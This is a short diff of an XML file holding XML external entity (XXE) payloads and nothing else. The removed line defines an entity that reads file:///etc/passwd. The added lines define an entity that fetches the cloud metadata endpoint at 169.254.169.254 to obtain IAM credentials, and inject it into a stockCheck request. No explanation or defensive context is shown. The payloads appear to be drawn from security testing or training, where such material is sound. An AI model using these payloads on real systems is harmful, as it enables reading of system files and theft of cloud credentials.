@@ -1,1 +1,3 @@
-<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe PUBLIC "blob" "file:///etc/passwd">]>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
